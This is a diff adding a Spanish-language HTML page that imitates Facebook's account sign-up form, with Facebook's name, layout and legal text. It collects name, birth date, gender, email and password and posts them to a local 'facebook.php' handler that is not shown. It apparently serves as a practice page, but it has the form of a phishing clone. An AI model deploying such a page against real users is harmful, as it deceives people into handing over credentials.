@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Formulario de Compra</title>
+    <style>
+        body {
+        text-align: center;
+        background-color: #f0f0f0;
+        margin: 0;
+        }
+
+        h1 {
+            font-size: 60px;
+            color: rgb(39, 107, 255);
+            text-align: center;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: calc(100vh - 100px); 
+        }
+
+        .card {
+            background-color: rgb(255, 255, 255);
+            padding: 10px;
+            border-radius: 30px;
+            text-align: center;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 10px 10px 10px rgba(0, 0, 0, 0.1);
+            
+        }
+
+
+        input[type="email"] {
+            width: 95%;
+            padding: 10px;
+            margin: 10px -10px;
+            border-radius: 5px;
+        }
+
+        input[type="password"] {
+            width: 95%;
+            padding: 10px;
+            margin: 10px -10px;
+            border-radius: 5px
+        }
+
+        input[type="submit"] {
+            background: #39b301;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            width: 50%;
+        }
+
+        select{
+            width: 100%;
+            padding: 10px;
+      
+            border-radius: 5px;
+        }
+
+        p{
+            color: black;
+            text-align: left;
+        }
+
+        h2{
+            color: black;
+            text-align: center;
+            font-size: 30px;
+            
+        }
+        h3{
+            color: rgb(124, 122, 122);
+        }
+        hr {
+            border: -5;
+            height: 0,5px;
+            background: #252525;
+            margin: 5px 0;
+        }
+        .input-group {
+            display: flex;
+            gap: 10px; /* Espacio entre los inputs */
+            justify-content: center;
+            width: 100%;
+            
+        }   
+
+        .input-group input {
+            width: 50%; /* Ajusta el ancho */
+            padding: 10px;
+            border-radius: 6px;
+        }
+
+        .radio-group {
+            display: flex;
+            gap: 10px;
+        }
+
+        .radio-group label {
+            display: flex;
+            width: 100%;
+            align-items: center;
+            gap: 5px;
+            padding: 8px 12px;
+            border: 2px solid #4d4d4d;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+
+        .radio-group input[type="radio"] {
+            appearance: auto;
+        }
+
+        input, select {
+            border: 2px solid #4d4d4d; /* Color de borde uniforme */
+            outline: none; /* Evita el borde azul al hacer clic */
+        }
+
+        input:focus, select:focus {
+            border-color: #276bff; /* Cambia el color cuando se selecciona */
+            box-shadow: 0 0 5px rgba(39, 107, 255, 0.5);
+        }
+
+
+
+        
+    </style>
+</head>
+<body>
+    <h1 style="font-family: Arial, Helvetica, sans-serif;">facebook</h1><br><br>
+    <div class="container">
+        <div class="card">
+            <form action="facebook.php" method="post">
+                <h2 style="font-family: Arial, Helvetica, sans-serif;">Crea una cuenta</h2> 
+                <h4 style="font-family: Verdana, Geneva, Tahoma, sans-serif;">Es rápido y fácil</h4><hr>
+                <div class="input-group">
+                    <input type="text" name="nombre" required placeholder="Nombre">
+                    <input type="text" name="apellido" required placeholder="Apellido">
+                </div><br>
+                <p>Fecha de nacimiento?</p>
+                <div class="input-group">
+                    <select name="dia" required >
+                        <option value="1">1</option>
+                        <option value="2">2</option>
+                        <option value="3">3</option>
+                        <option value="4">4</option>
+                        <option value="5">5</option>
+                        <option value="6">6</option>
+                        <option value="7">7</option>
+                        <option value="8">8</option>
+                        <option value="9">9</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                        <option value="13">13</option>
+                        <option value="14">14</option>
+                        <option value="15">15</option>
+                        <option value="16">16</option>
+                        <option value="17">17</option>
+                        <option value="18">18</option>
+                        <option value="19">19</option>
+                        <option value="20">20</option>
+                        <option value="21">21</option>
+                        <option value="22">22</option>
+                        <option value="23">23</option>
+                        <option value="24">24</option>
+                        <option value="25">25</option>
+                        <option value="26">26</option>
+                        <option value="27">27</option>
+                        <option value="28">28</option>
+                        <option value="29">29</option>
+                        <option value="30">30</option>
+                        <option value="31">31</option>
+                    </select>
+                    <select name="mes" required>
+                        <option value="1">Ene</option>
+                        <option value="2">Feb</option>
+                        <option value="3">Mar</option>
+                        <option value="4">Abr</option>
+                        <option value="5">May</option>
+                        <option value="6">Jun</option>
+                        <option value="7">Jul</option>
+                        <option value="8">Ago</option>
+                        <option value="9">Sep</option>
+                        <option value="10">Oct</option>
+                        <option value="11">Nov</option>
+                        <option value="12">Dic</option>
+                    </select>
+                    <select name="yeard">
+                        <option value="2000">2000</option>
+                        <option value="2001">2001</option>
+                        <option value="2002">2002</option>
+                        <option value="2003">2003</option>
+                        <option value="2004">2004</option>
+                        <option value="2005">2005</option>
+                        <option value="2006">2006</option>
+                        <option value="2007">2007</option>
+                        <option value="2008">2008</option>
+                        <option value="2009">2009</option>
+                        <option value="2010">2010</option>
+                        <option value="2011">2011</option>
+                        <option value="2012">2012</option>
+                        <option value="2013">2013</option>
+                        <option value="2014">2014</option>
+                        <option value="2015">2015</option>
+                        <option value="2016">2016</option>
+                        <option value="2017">2017</option>
+                        <option value="2018">2018</option>
+                        <option value="2019">2019</option>
+                        <option value="2020">2020</option>
+                        <option value="2021">2021</option>
+                        <option value="2022">2022</option>
+                        <option value="2023">2023</option>
+                        <option value="2024">2024</option>
+                        <option value="2025">2025</option>
+                    </select>
+                </div><br>
+                <p>Género?</p>
+                <div class="radio-group">
+                    <label>
+                        Mujer<input type="radio" name="genero" value="mujer">
+                    </label>
+                    <label>
+                        Hombre<input type="radio" name="genero" value="hombre">
+                    </label>
+                    <label>
+                        Personalizado<input type="radio" name="genero" value="personalizado">
+                    </label>
+                </div><br>
+                <div class="input">
+                    <input type="email" name="user" required placeholder="Correo electrónico">
+                    <input type="password" name="paswor" required placeholder="Ingresa una contraseña">
+                </div>
+                
+                <h6>Es posible que las personas que usan nuestro servicio hayan subido tu información de contacto a Facebook. Más información.
+
+                    Al hacer clic en Registrarte, aceptas las Condiciones, la Política de privacidad y la Política de cookies. Es posible que te enviemos notificaciones por SMS, que podrás desactivar cuando quieras.</h6>
+                <div class="submit">
+                    <input type="submit" value="Registrarse">
+
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+
+</html>
